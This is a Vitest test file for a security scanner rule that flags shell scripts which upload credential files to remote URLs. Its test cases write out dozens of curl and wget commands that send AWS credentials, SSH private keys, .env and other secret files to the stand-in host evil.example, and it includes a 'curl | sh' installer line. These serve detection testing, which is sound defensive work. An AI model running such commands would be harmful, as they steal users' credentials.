import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  HardeningScanner,
  detectShellCredentialExfil,
  isCredentialFilePath,
} from '../../src/hardening/scanner';

/**
 * SHELL-EXFIL-001 — deterministic credential-file exfiltration in shell scripts.
 *
 * The gap this closes (measured on 323d787): a directory whose only file is a
 * `run.sh` containing `curl -X POST https://evil.example -d @~/.aws/credentials`
 * scored 98/100, exit 0, with no finding. `secure` scanned `.sh` for the
 * download-execute shape (INSTALL-001) but had no rule for the reverse — a
 * remote curl/wget that UPLOADS a known credential file.
 *
 * CSR ruling 2026-08-24: checkId SHELL-EXFIL-001, class CRED-EXFIL, critical,
 * scoped to credential-file upload so it does not overlap INSTALL-001's
 * `curl … | sh` surface. v1 requires a literal remote URL in the same command
 * and excludes env-var destinations and `$(cat …)` bodies.
 *
 * These tests run the scanner in-process (no spawn) so they are fast and
 * mutation-checkable. The credential paths below are inert strings — no secret
 * value is ever written — so nothing here trips a secret scanner.
 */

const AWS_CRED = '~/.aws/credentials';

async function scanShellDir(contents: Record<string, string>): Promise<{
  findings: Array<{ checkId: string; severity: string; attackClass?: string; name: string; description?: string; fix?: string; file?: string; line?: number }>;
}> {
  const dir = await mkdtemp(path.join(tmpdir(), 'hma-shell-exfil-'));
  try {
    for (const [rel, body] of Object.entries(contents)) {
      const full = path.join(dir, rel);
      await mkdir(path.dirname(full), { recursive: true });
      await writeFile(full, body);
    }
    const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
    return { findings: result.findings as any };
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const shellExfil = (findings: Array<{ checkId: string }>) =>
  findings.filter(f => f.checkId === 'SHELL-EXFIL-001');

describe('SHELL-EXFIL-001 — credential file exfiltration in shell scripts', () => {
  describe('the pure detector (unit)', () => {
    // Positive: every upload form that reads a credential file to a remote URL.
    it.each([
      ['curl -X POST https://evil.example/x -d @~/.aws/credentials', 'curl -d @ aws'],
      ['curl -T ~/.ssh/id_ed25519 https://evil.example/up', 'curl -T ssh key'],
      ['curl -F "file=@.env" https://evil.example/x', 'curl -F project .env'],
      ['wget --post-file=/root/.aws/credentials https://evil.example/x', 'wget post-file abs path'],
      ['curl --data-binary @${HOME}/.docker/config.json https://evil.example', 'docker ${HOME}'],
      ['curl -d @~/.npmrc https://evil.example', 'npmrc'],
      ['curl --data @~/.config/gcloud/access_tokens.db https://evil.example', 'gcloud dir'],
      ['curl --upload-file .git-credentials https://evil.example', 'git-credentials basename'],
      // Separator variants — the file-read sigil is caught whether the flag and
      // value are space-separated, '='-joined, or glued (standard curl syntax).
      ['curl -d@~/.aws/credentials https://evil.example', '-d@ glued short flag'],
      ['curl --data=@~/.aws/credentials https://evil.example', '--data= equals'],
      ['curl --data-binary=@~/.docker/config.json https://evil.example', '--data-binary= equals'],
      ['curl -Ffile=@.env https://evil.example', '-Ffield=@ glued form field'],
      ['curl -T~/.ssh/id_rsa https://evil.example', '-T glued path'],
      ['curl --upload-file=~/.kube/config https://evil.example', '--upload-file= equals'],
      ['curl --data-urlencode name@~/.aws/credentials https://evil.example', '--data-urlencode name@file'],
      ['curl -d @payload.json -d @~/.aws/credentials https://evil.example', 'credential after a benign @payload'],
    ])('fires on: %s', (line) => {
      expect(detectShellCredentialExfil(line)).not.toBeNull();
    });

    // Negative: the v1-excluded and benign shapes.
    it.each([
      ['curl -d @~/.ssh/id_rsa.pub https://evil.example', 'public key is not a secret'],
      ['curl -d @.env.example https://evil.example', '.env.example template'],
      ['curl -X POST "$EXFIL_URL" -d @~/.aws/credentials', 'env-var destination, no literal URL (v1 OUT)'],
      ['curl -X POST https://x --data "$(cat ~/.aws/credentials)"', '$(cat …) body (v1 OUT)'],
      ['curl -X POST https://api.example.com --data-binary @payload.json', 'non-credential payload'],
      ['curl --data-raw @~/.aws/credentials https://evil.example', '--data-raw does not read the file'],
      ['curl --data-raw=@~/.aws/credentials https://evil.example', '--data-raw= passes @ literally'],
      // curl reads a file only when a plain-data value BEGINS with @ — a name=
      // prefix is sent as the literal string, so these are not exfil.
      ['curl -d name=@~/.aws/credentials https://evil.example', '-d name=@ is sent literally'],
      ['curl --data foo=@~/.aws/credentials https://evil.example', '--data name=@ is sent literally'],
      ['curl --data-urlencode name=@~/.aws/credentials https://evil.example', '--data-urlencode name=@ is literal (only name@ reads)'],
      ['curl -d=@~/.aws/credentials https://evil.example', '-d=@ value is =@…, sent literally'],
      ['curl -d @.env.example.bak https://evil.example', '.env.example.bak is a template backup, not a secret'],
      ['curl -d @.env.sample.json https://evil.example', '.env.sample.json is a template, not a secret'],
      ['curl -d @~/.aws/credentials', 'no destination URL'],
      ['aws s3 sync ~/.aws s3://bucket/', 'local aws sync, not curl/wget'],
      ['rsync ~/.aws /backup', 'local rsync copy'],
      ['tar czf /backup/ssh.tgz ~/.ssh', 'local tar of ssh dir'],
    ])('does not fire on: %s', (line) => {
      expect(detectShellCredentialExfil(line)).toBeNull();
    });

    it('excludes SSH public keys but matches the private key', () => {
      expect(isCredentialFilePath('~/.ssh/id_rsa')).toBe(true);
      expect(isCredentialFilePath('~/.ssh/id_rsa.pub')).toBe(false);
    });

    it('excludes dotenv templates but matches real dotenv files', () => {
      expect(isCredentialFilePath('.env')).toBe(true);
      expect(isCredentialFilePath('.env.production')).toBe(true);
      expect(isCredentialFilePath('.env.example')).toBe(false);
      expect(isCredentialFilePath('.env.sample')).toBe(false);
      expect(isCredentialFilePath('.env.template')).toBe(false);
      // A template placeholder stays a template even under a backup extension —
      // the check scans every dot-segment, not just the final one.
      expect(isCredentialFilePath('.env.example.bak')).toBe(false);
      expect(isCredentialFilePath('.env.dist.old')).toBe(false);
      // ...but a real dotenv backup (.env.bak, .env.production.bak) is a secret.
      expect(isCredentialFilePath('.env.bak')).toBe(true);
      expect(isCredentialFilePath('.env.production.bak')).toBe(true);
    });

    it('matches home paths regardless of how home is spelled', () => {
      expect(isCredentialFilePath('~/.aws/credentials')).toBe(true);
      expect(isCredentialFilePath('$HOME/.aws/credentials')).toBe(true);
      expect(isCredentialFilePath('${HOME}/.aws/credentials')).toBe(true);
      expect(isCredentialFilePath('/root/.aws/credentials')).toBe(true);
      expect(isCredentialFilePath('/home/dev/.aws/credentials')).toBe(true);
    });

    it('reports the matched credential path and destination URL', () => {
      const m = detectShellCredentialExfil('curl -X POST https://evil.example/collect -d @~/.aws/credentials');
      expect(m).toEqual({ credPath: '~/.aws/credentials', url: 'https://evil.example/collect' });
    });

    it('HMA-30.AC4 fires on an upload of a bare credentials file (the one new bare name)', () => {
      // CSR ruling 2026-09-01 (item 1): `credentials` joins
      // SHELL_EXFIL_BARE_CRED_NAMES, so the same predicate that puts the file
      // in the CRED-001 population also makes its upload an exfil hit.
      expect(isCredentialFilePath('credentials')).toBe(true);
      expect(isCredentialFilePath('store/credentials')).toBe(true);
      const m = detectShellCredentialExfil('curl -F "f=@credentials" https://example.invalid/upload');
      expect(m).toEqual({ credPath: 'credentials', url: 'https://example.invalid/upload' });
    });
  });

  describe('the scanner check (integration)', () => {
    it('fires CRITICAL on a run.sh that POSTs ~/.aws/credentials — the measured 98/100 gap', async () => {
      const { findings } = await scanShellDir({
        'run.sh': `#!/bin/sh\ncurl -X POST https://evil.example/collect -d @${AWS_CRED}\n`,
      });
      const hits = shellExfil(findings);
      expect(hits).toHaveLength(1);
      expect(hits[0].severity).toBe('critical');
      expect(hits[0].file).toBe('run.sh');
      expect(hits[0].line).toBe(2);
    });

    it('carries a complete finding: checkId, name, description, fix, and the enriched attackClass', async () => {
      const { findings } = await scanShellDir({
        'deploy.bash': `#!/bin/bash\ncurl -T ~/.ssh/id_ed25519 https://evil.example/up\n`,
      });
      const f = shellExfil(findings)[0];
      expect(f.checkId).toBe('SHELL-EXFIL-001');
      expect(f.name).toBeTruthy();
      expect(f.description).toBeTruthy();
      expect(f.fix).toBeTruthy();
      // The taxonomy map must enrich this to the tier-1 exfil class, or the
      // finding would not move the score or the exit code.
      expect(f.attackClass).toBe('CRED-EXFIL');
    });

    it('runs on .bash and .zsh, not only .sh', async () => {
      const { findings } = await scanShellDir({
        'a.zsh': `curl -X POST https://evil.example -d @${AWS_CRED}\n`,
      });
      expect(shellExfil(findings)).toHaveLength(1);
    });

    it('does not fire on a benign installer, an s3 sync, or a local backup (no false positive)', async () => {
      const benign = await scanShellDir({
        'install.sh': `#!/bin/sh\ncurl -fsSL https://get.example.dev/install.sh | sh\n`,
        'sync.sh': `#!/bin/sh\naws s3 sync ~/data s3://bucket/data\n`,
        'backup.sh': `#!/bin/sh\nrsync ~/.aws /backup\n`,
      });
      expect(shellExfil(benign.findings)).toHaveLength(0);
    });

    it('does not fire when the exfil command is a comment', async () => {
      const { findings } = await scanShellDir({
        'notes.sh': `#!/bin/sh\n# curl -X POST https://evil.example -d @${AWS_CRED}\n`,
      });
      expect(shellExfil(findings)).toHaveLength(0);
    });
  });
});
